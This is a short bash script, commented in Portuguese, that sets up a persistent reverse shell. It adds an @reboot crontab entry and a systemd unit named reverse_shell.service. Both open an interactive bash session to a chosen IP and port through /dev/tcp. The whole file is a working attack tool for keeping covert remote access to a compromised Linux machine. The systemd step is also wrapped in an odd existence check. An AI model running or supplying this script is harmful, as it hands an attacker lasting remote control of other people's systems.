#!/usr/bin/env bash

# Definir o IP e a Porta
ip="192.168.29.135" #editar
porta="221" #editar

# Comando crontab para persistência
(crontab -l 2>/dev/null | grep -q "bash -i >& /dev/tcp/$ip/$porta 0>&1") || \
(crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'") | crontab -

# Verificar e configurar persistência via Systemd
if [ -f /etc/systemd/system/reverse_shell.service ]; then 
    echo "[*] Configurando persistência via Systemd..."

    # Configuração do arquivo de serviço Systemd
    echo "[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/reverse_shell.service > /dev/null

    sudo systemctl enable reverse_shell.service
    sudo systemctl start reverse_shell.service
fi
